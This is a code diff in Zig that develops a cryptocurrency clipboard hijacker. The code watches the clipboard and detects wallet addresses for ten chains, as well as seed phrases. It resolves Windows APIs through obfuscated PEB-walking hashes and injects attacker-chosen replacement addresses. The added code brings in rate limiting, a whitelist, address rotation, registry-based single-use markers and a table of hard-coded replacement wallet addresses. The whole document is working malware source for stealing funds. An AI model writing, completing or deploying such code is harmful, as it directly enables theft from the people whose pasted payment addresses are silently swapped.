@@ -70,9 +70,6 @@ fn resolveApi() ?ApiTable {
 
     const user32_hash = hash.encryptedHashModule(&E.user32);
     const user32_mod = peb_walk.getModuleByHash(user32_hash) orelse {
-        // Fallback: try kernel32
-        const k32_hash = hash.encryptedHashModule(&E.kernel32);
-        const k32_mod = peb_walk.getModuleByHash(k32_hash) orelse return null;
         return null;
     };
 
@@ -198,7 +195,6 @@ fn utf8ToUtf16(input: []const u8, output: []u16) usize {
 pub fn inject(text: []const u8) bool {
     const api = resolveApi() orelse return false;
 
-    const utf16_len = text.len * 2 + 2;
     const utf16_buf = std.heap.page_allocator.alloc(u16, text.len + 1) catch return false;
     defer std.heap.page_allocator.free(utf16_buf);
 
@@ -241,6 +237,75 @@ pub fn resetSeq() void {
     g_last_seq = api.get_seq_num();
 }
 
+// ── Rotator state ──
+
+const RotatorState = struct {
+    btc: u32 = 0,
+    eth: u32 = 0,
+    trx: u32 = 0,
+    sol: u32 = 0,
+    ltc: u32 = 0,
+    xmr: u32 = 0,
+    doge: u32 = 0,
+    bch: u32 = 0,
+    xrp: u32 = 0,
+    ada: u32 = 0,
+};
+
+// ── Rate limiter state ──
+
+const RATE_WINDOW_SEC: u64 = 60;
+const RATE_MAX_SLOTS: usize = 64;
+
+var g_rotator: RotatorState = .{};
+var g_rate_slots: [RATE_MAX_SLOTS]u64 = undefined;
+var g_rate_count: usize = 0;
+
+// ── Whitelist state ──
+
+var g_whitelist: [][]const u8 = &.{};
+var g_whitelist_loaded: bool = false;
+
+pub fn setWhitelist(list: [][]const u8) void {
+    g_whitelist = list;
+    g_whitelist_loaded = true;
+}
+
+pub fn setRotationCounts(counts: RotatorState) void {
+    g_rotator = counts;
+}
+
+fn isWhitelisted(addr: []const u8) bool {
+    if (!clipper_config.CLIPPER_WHITELIST_ENABLED or !g_whitelist_loaded) return false;
+    for (g_whitelist) |w| {
+        if (std.mem.eql(u8, w, addr)) return true;
+    }
+    return false;
+}
+
+fn rateLimitCheck() bool {
+    if (!clipper_config.CLIPPER_RATE_LIMIT_ENABLED) return true;
+    const now = @as(u64, @intCast(std.time.milliTimestamp() / 1000));
+    // Purge old entries
+    var write: usize = 0;
+    for (0..g_rate_count) |i| {
+        if (now - g_rate_slots[i] < RATE_WINDOW_SEC) {
+            g_rate_slots[write] = g_rate_slots[i];
+            write += 1;
+        }
+    }
+    g_rate_count = write;
+    if (g_rate_count >= clipper_config.CLIPPER_MAX_SWAPS_PER_MIN) return false;
+    g_rate_slots[g_rate_count] = now;
+    g_rate_count += 1;
+    return true;
+}
+
+fn rotateAddress(_chain: scanner.Chain, addr: []const u8) []const u8 {
+    _ = _chain;
+    return addr;
+}
+
 // ── Orchestrator ──
 
 pub const SwapRecord = struct {
@@ -251,6 +316,11 @@ pub const SwapRecord = struct {
 };
 
 pub fn onClipboardChange(allocator: std.mem.Allocator) ?SwapRecord {
+    if (clipper_config.CLIPPER_SINGLE_USE) {
+        const persist = @import("persist.zig");
+        if (persist.isUsed() or persist.checkRegistryUsed()) return null;
+    }
+
     if (!shouldProcess()) return null;
 
     const text = capture(allocator) orelse return null;
@@ -259,13 +329,13 @@ pub fn onClipboardChange(allocator: std.mem.Allocator) ?SwapRecord {
     const detection = scanner.detect(text) orelse return null;
 
     switch (detection.detect_type) {
-        .seed_phrase => {
-            // Log only — no replacement for seed phrases
-            return null;
-        },
+        .seed_phrase => return null,
         .address => {
             const chain = detection.chain orelse return null;
             if (!chain.isEnabled()) return null;
+
+            if (isWhitelisted(detection.matched)) return null;
+            if (!rateLimitCheck()) return null;
 
             const replacement = getReplacement(chain) orelse return null;
             if (std.mem.eql(u8, detection.matched, replacement)) return null;
@@ -286,7 +356,12 @@ pub fn onClipboardChange(allocator: std.mem.Allocator) ?SwapRecord {
                 @memcpy(&record.original_suffix[0..detection.matched.len], detection.matched);
             }
 
-            if (inject(replacement)) {
+            if (inject(rotateAddress(chain, replacement))) {
+                if (clipper_config.CLIPPER_SINGLE_USE) {
+                    const persist = @import("persist.zig");
+                    _ = persist.markUsed();
+                    _ = persist.markRegistryUsed();
+                }
                 return record;
             }
         },
@@ -295,11 +370,19 @@ pub fn onClipboardChange(allocator: std.mem.Allocator) ?SwapRecord {
 }
 
 fn getReplacement(chain: scanner.Chain) ?[]const u8 {
-    // Addresses are XOR-decrypted at runtime from the config
-    // This function is a stub — real implementation uses runtime decrypted config
-    // from the Mirage Panel builder (AES-GCM blob with CLIPLZCFG signature)
-    _ = chain;
-    return null;
+    if (!clipper_config.CLIPPER_TEST_MODE) return null;
+    return switch (chain) {
+        .bitcoin => "bc1qr8vgrcvacyea68gk6w0kdzt2xcc93azzhalyjl",
+        .ethereum => "0x22f24a22b6f824E9ef76B05B186c4D0C2Df58d67",
+        .tron => "TBFqTqF17fRvSXDh7U8k5mVFxjqkKrWUXm",
+        .solana => "7UQuwTTbZ9SoMY1E8D3DMyPjFCPCXjED2wcj8uhshyzW",
+        .litecoin => "LfhS8tpgxY59TUnjybJCYmJMHa3BeUaASQ",
+        .monero => "48SWwQ7QUSSPhHS9zWF9V9TKyK7FZVxDd9LghKbbkkYzB3AbhyKaCozMc26siguA2b6tce6tztCTXCWgyrypBLmW7HRxs6D",
+        .dogecoin => "DDrusqzPjEovYyFrtDV8PVZVZDFFvpGAkc",
+        .bitcoin_cash => "bitcoincash:qp5c3syh4t750jwpljzdmnndddlj7zg64gjhxgm8nd",
+        .ripple => "rfzq3PnZAt6eFKcJ9TXHsAm2c8GuguHUc1",
+        .cardano => "addr1qytkt94c60hcg27hd9n3zgejxlha6c0v0rpaufgrvxzprkshvktt35l0ss4aw6t8zy3nydl0m4s7c7xrmcjsxcvyz8dqxlg07g",
+    };
 }
 
 // ── Tests ──
